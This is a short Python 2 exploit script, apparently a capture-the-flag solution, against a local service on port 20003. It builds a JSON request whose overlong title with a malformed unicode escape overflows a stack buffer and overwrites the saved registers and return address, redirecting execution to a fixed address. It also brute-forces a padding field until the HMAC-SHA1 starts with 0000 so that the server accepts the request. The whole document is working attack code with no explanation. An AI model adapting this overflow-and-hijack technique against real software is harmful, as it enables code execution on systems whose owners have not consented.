import struct
import telnetlib
import socket
import json
import hmac
from hashlib import sha1

IP = "127.0.0.1"
PORT = 20003

def p(x):
    return struct.pack("<I", x)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
fd = s.makefile('rw', bufsize=0)
print "[+] Getting token"
token = s.recv(1024)  
token = token.strip().strip('"')  
print "[+] Token: " + token
write_addr = 0x08048d40
write_stack = p(0xdeadbeef) + p(1) + p(0x0804a3d4) + p(4)
ebx = "B" * 4
ebp = "E" * 4
eip = p(write_addr)
edi = "D" * 4
esi = "C" * 4
dump = "A" * 19 + ebx + esi + edi + ebp + eip
title = "O" * 127
d = '{"title": "' + title + '\\\\u' + dump + '", "contents": "cool", "tags": ["a", "b", "c"], "serverip": "127.0.0.1"}'
print("[+] JSON: " + d)
mac = hmac.new(token, token + "\n" + d, sha1).digest()      
print "[+] Test request MAC: " + mac.encode('hex')
print "[+] Modifying hash till it starts with 0000"
i = 0
new_d = ""
while True:
    new_d = d[0:-1] + ', "padding": "' + str(i) + '"}'
    hexmac = hmac.new(token, token + "\n" + new_d, sha1).digest().encode("hex")
    if "0000" in hexmac[0:4]:
            break
    i += 1

print "[+] New JSON: " + new_d
print "[+] New MAC: " + hmac.new(token, token + "\n" + new_d, sha1).digest().encode("hex")
fd.write(token + "\n" + new_d)
s.close()